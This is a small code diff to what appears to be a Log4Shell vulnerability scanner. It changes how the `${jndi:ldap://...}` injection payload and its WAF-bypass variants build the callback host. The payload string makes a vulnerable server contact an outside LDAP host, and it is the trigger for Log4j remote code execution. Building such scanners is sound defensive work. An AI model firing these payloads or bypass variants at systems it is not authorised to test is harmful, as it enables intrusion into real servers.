@@ -334,10 +334,12 @@ def parse_url(url):
 def scan_url(url, callback_host):
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+    payload = '${jndi:ldap://%s/%s}' % (callback_host, random_string)
+    #payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
     payloads = [payload]
     if args.waf_bypass_payloads:
-        payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
+        #payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
+        payloads.extend(generate_waf_bypass_payloads(f'{callback_host}', random_string))
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
         if args.request_type.upper() == "GET" or args.run_all_tests:
@@ -483,7 +485,7 @@ def main():
 
 
 def single_main(args):
-    
+
     global exitFlag
     global workQueue
 
